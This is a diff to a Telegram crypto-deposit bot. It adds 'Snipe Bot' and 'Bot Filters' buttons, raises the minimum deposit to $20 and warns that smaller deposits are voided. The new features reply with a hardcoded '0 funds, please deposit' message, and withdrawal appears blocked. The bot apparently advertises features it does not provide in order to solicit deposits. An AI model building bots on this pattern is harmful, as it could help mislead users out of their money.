@@ -150,6 +150,10 @@ function getMainMenuKeyboard() {
       Markup.button.callback("▫️ Withdraw", "withdraw"),
     ],
     [
+      Markup.button.callback("🎯 Snipe Bot", "snipe_bot"),
+      Markup.button.callback("✨ Bot Filters", "bot_filters"),
+    ],
+    [
       Markup.button.callback("📊 Account", "account"),
       Markup.button.callback("🎁 Referral", "referral"),
     ],
@@ -718,10 +722,15 @@ bot.action(/^deposit_coin:(btc|eth|sol)$/, async (ctx) => {
   });
 
   await ctx.reply(
-    `Enter the amount you want to deposit in USD using ${COINS[coin]}.\n\nExample: 25`
+    [
+      `Please enter the amount you would like to deposit in USD using ${COINS[coin]}`,
+      "",
+      "The minimum amount to deposit is $20, anything under that will be voided and you will not recieve it in your wallet.",
+      "",
+      "Example: $50",
+    ].join("\n")
   );
 });
-
 
 bot.action("withdraw", async (ctx) => {
   await ctx.answerCbQuery();
@@ -731,6 +740,22 @@ bot.action("withdraw", async (ctx) => {
 
   await ctx.reply(
     "You have not purchased Kevy, once you have done so by pressing Get Access, you will be able to use the following features."
+  );
+});
+
+bot.action("snipe_bot", async (ctx) => {
+  await ctx.answerCbQuery();
+
+  await ctx.reply(
+    "You have deposited 0 funds into your account, please deposit using the menu above to continue."
+  );
+});
+
+bot.action("bot_filters", async (ctx) => {
+  await ctx.answerCbQuery();
+
+  await ctx.reply(
+    "You have deposited 0 funds into your account, please deposit using the menu above to continue."
   );
 });
 
@@ -835,7 +860,6 @@ bot.action("pay", async (ctx) => {
   await ctx.reply("You already have free access. Use the menu below to continue.");
 });
 
-
 bot.action(/^coin:(btc|eth|sol)$/, async (ctx) => {
   await ctx.answerCbQuery();
 
@@ -864,15 +888,16 @@ bot.on("text", async (ctx, next) => {
     return next();
   }
 
-  const amount = Number.parseFloat(ctx.message.text);
+  const amountText = ctx.message.text.replace(/[$,]/g, "").trim();
+  const amount = Number.parseFloat(amountText);
 
   if (!Number.isFinite(amount) || amount <= 0) {
-    await ctx.reply("Please enter a valid deposit amount. Example: 25");
+    await ctx.reply("Please enter a valid deposit amount. Example: $50");
     return;
   }
 
-  if (amount < 5) {
-    await ctx.reply("Minimum deposit amount is 5 USD. Please enter a higher amount.");
+  if (amount < 20) {
+    await ctx.reply("Minimum deposit amount is 20 USD. Please enter a higher amount.");
     return;
   }
 
@@ -942,20 +967,20 @@ bot.on("text", async (ctx, next) => {
 
     console.log("Sending admin deposit alert...");
 
-await sendAdminMessage(
-  [
-    "<b>New deposit attempt</b>",
-    `Payment ID: <code>${escapeHtml(payment.payment_id)}</code>`,
-    `User ID: <code>${escapeHtml(ctx.from.id)}</code>`,
-    `Username: ${escapeHtml(telegramUsername || "none")}`,
-    `Name: ${escapeHtml(telegramName || "unknown")}`,
-    `Coin: ${escapeHtml(coin.toUpperCase())}`,
-    `Amount: ${escapeHtml(amount)} USD`,
-    `Crypto Amount: ${escapeHtml(payment.pay_amount ? `${payment.pay_amount} ${coin.toUpperCase()}` : "unknown")}`,
-    `Address: <code>${escapeHtml(payment.pay_address)}</code>`,
-    `Created: ${escapeHtml(formatTimestamp(new Date().toISOString()))}`,
-  ].join("\n")
-);
+    await sendAdminMessage(
+      [
+        "<b>New deposit attempt</b>",
+        `Payment ID: <code>${escapeHtml(payment.payment_id)}</code>`,
+        `User ID: <code>${escapeHtml(ctx.from.id)}</code>`,
+        `Username: ${escapeHtml(telegramUsername || "none")}`,
+        `Name: ${escapeHtml(telegramName || "unknown")}`,
+        `Coin: ${escapeHtml(coin.toUpperCase())}`,
+        `Amount: ${escapeHtml(amount)} USD`,
+        `Crypto Amount: ${escapeHtml(payment.pay_amount ? `${payment.pay_amount} ${coin.toUpperCase()}` : "unknown")}`,
+        `Address: <code>${escapeHtml(payment.pay_address)}</code>`,
+        `Created: ${escapeHtml(formatTimestamp(new Date().toISOString()))}`,
+      ].join("\n")
+    );
 
     await ctx.reply(
       [
